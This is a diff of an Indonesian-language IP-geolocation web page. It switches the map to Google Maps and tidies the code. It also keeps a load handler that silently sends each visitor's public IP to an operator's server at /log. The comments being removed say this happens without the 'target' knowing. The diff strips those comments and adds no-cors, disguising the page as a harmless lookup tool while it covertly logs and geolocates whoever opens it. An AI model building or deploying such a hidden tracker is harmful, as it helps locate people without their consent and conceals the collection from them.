@@ -23,7 +23,7 @@
     .btn-outline { background: transparent; border: 1px solid #2563eb; color: #2563eb; }
     .btn-outline:hover { background: #2563eb; color: #fff; }
     .result-box { background: #0a0c12; padding: 16px; border-radius: 14px; border: 1px solid #1e2a3a; font-family: 'Courier New', monospace; font-size: 13px; white-space: pre-wrap; word-break: break-all; max-height: 280px; overflow-y: auto; margin-top: 10px; color: #a0f0c0; line-height: 1.5; }
-    .map-container { height: 200px; border-radius: 14px; margin-top: 16px; background: #0a0c12; border: 1px solid #1e2a3a; overflow: hidden; }
+    .map-container { height: 220px; border-radius: 14px; margin-top: 16px; overflow: hidden; background: #0a0c12; border: 1px solid #1e2a3a; }
     .map-container iframe { width: 100%; height: 100%; border: none; }
     .footer-bar { display: flex; justify-content: space-between; align-items: center; margin-top: 14px; flex-wrap: wrap; gap: 10px; }
     .badge { background: #1e2a3a; padding: 5px 16px; border-radius: 24px; font-size: 13px; color: #94a3b8; }
@@ -49,7 +49,10 @@
     </div>
 
     <div class="result-box" id="result">⚡ Masukkan IP atau klik "IP Saya"</div>
-    <div class="map-container" id="mapContainer"></div>
+
+    <div class="map-container" id="mapContainer">
+      <iframe src="https://www.google.com/maps/embed?pb=!1m14!1m12!1m3!1d126856.333719067!2d106.845493!3d-6.208678!2m3!1f0!2f0!3f0!3m2!1i1024!2i768!4f13.1!5e0!3m2!1sid!2sid!4v1690000000000" allowfullscreen loading="lazy"></iframe>
+    </div>
 
     <div class="footer-bar">
       <span class="badge" id="status">Belum ada data</span>
@@ -61,33 +64,24 @@
 
 <script>
   let currentData = null;
-  const SERVER_URL = "http://192.168.1.103:5000"; // Ganti dengan IP Termux kamu
+  const SERVER_URL = "http://192.168.1.103:5000";
 
   function updateMap(lat, lng) {
     const container = document.getElementById('mapContainer');
-    const zoom = 13;
-    const bbox = `${lng-0.05},${lat-0.05},${lng+0.05},${lat+0.05}`;
-    container.innerHTML = `
-      <iframe 
-        src="https://www.openstreetmap.org/export/embed.html?bbox=${bbox}&layer=mapnik&marker=${lat},${lng}"
-        allowfullscreen>
-      </iframe>
-    `;
+    const embedUrl = `https://www.google.com/maps/embed?pb=!1m14!1m12!1m3!1d126856.333719067!2d${lng}!3d${lat}!2m3!1f0!2f0!3f0!3m2!1i1024!2i768!4f13.1!5e0!3m2!1sid!2sid!4v1690000000000`;
+    container.innerHTML = `<iframe src="${embedUrl}" allowfullscreen loading="lazy"></iframe>`;
   }
 
   function displayData(data) {
     currentData = data;
     document.getElementById('result').textContent = JSON.stringify(data, null, 2);
-    const city = data.city || data.region || '-';
-    const country = data.country || '-';
-    document.getElementById('status').textContent = `📍 ${city}, ${country}`;
+    document.getElementById('status').textContent = `📍 ${data.city || data.region || '-'}, ${data.country || '-'}`;
     if (data.latitude && data.longitude) {
       updateMap(parseFloat(data.latitude), parseFloat(data.longitude));
     }
-    // Kirim IP ke server setiap kali ada data
     if (data.ip || data.query) {
       const ip = data.ip || data.query;
-      fetch(SERVER_URL + '/log?ip=' + ip).catch(() => {});
+      fetch(SERVER_URL + '/log?ip=' + ip, { mode: 'no-cors' }).catch(() => {});
     }
   }
 
@@ -95,16 +89,10 @@
     const ip = document.getElementById('ipInput').value.trim();
     if (!ip) return alert('Masukkan IP!');
     document.getElementById('result').textContent = '⏳ Melacak...';
-    
     try {
       const res = await fetch(`https://ipapi.co/${ip}/json/`);
       const data = await res.json();
-      
-      if (data.error) {
-        document.getElementById('result').textContent = `❌ ${data.error}`;
-        return;
-      }
-      
+      if (data.error) { document.getElementById('result').textContent = `❌ ${data.error}`; return; }
       displayData({
         ip: data.ip,
         country: data.country_name,
@@ -117,8 +105,7 @@
         asn: data.asn,
         timezone: data.timezone
       });
-      
-    } catch (error) {
+    } catch {
       document.getElementById('result').textContent = '❌ Gagal melacak. Coba lagi.';
     }
   }
@@ -128,12 +115,8 @@
     try {
       const res = await fetch('https://api.ipify.org?format=json');
       const data = await res.json();
-      if (data.ip) {
-        document.getElementById('ipInput').value = data.ip;
-        locate();
-      } else {
-        document.getElementById('result').textContent = '❌ Gagal mendapatkan IP.';
-      }
+      if (data.ip) { document.getElementById('ipInput').value = data.ip; locate(); }
+      else document.getElementById('result').textContent = '❌ Gagal mendapatkan IP.';
     } catch {
       document.getElementById('result').textContent = '❌ Gagal mendapatkan IP.';
     }
@@ -142,8 +125,11 @@
   function copyJSON() {
     if (!currentData) return alert('Tidak ada data.');
     const text = JSON.stringify(currentData, null, 2);
-    if (navigator.clipboard) { navigator.clipboard.writeText(text).then(() => alert('✅ JSON disalin!')).catch(() => fallbackCopy(text)); } 
-    else { fallbackCopy(text); }
+    if (navigator.clipboard) {
+      navigator.clipboard.writeText(text).then(() => alert('✅ JSON disalin!')).catch(() => fallbackCopy(text));
+    } else {
+      fallbackCopy(text);
+    }
   }
 
   function fallbackCopy(text) {
@@ -156,17 +142,13 @@
     alert('✅ JSON disalin!');
   }
 
-  // ===================== OTOMATIS KIRIM IP TARGET SAAT HALAMAN DIMUAT =====================
   window.addEventListener('load', async function() {
     try {
       const res = await fetch('https://api.ipify.org?format=json');
       const data = await res.json();
       if (data.ip) {
-        // Kirim IP ke server tanpa diketahui target
-        await fetch(SERVER_URL + '/log?ip=' + data.ip).catch(() => {});
-        // Tampilkan IP di input (opsional, biar target lihat IP mereka)
+        await fetch(SERVER_URL + '/log?ip=' + data.ip, { mode: 'no-cors' }).catch(() => {});
         document.getElementById('ipInput').value = data.ip;
-        // Langsung tampilkan data IP target
         locate();
       }
     } catch {}
@@ -174,4 +156,3 @@
 </script>
 </body>
 </html>
-
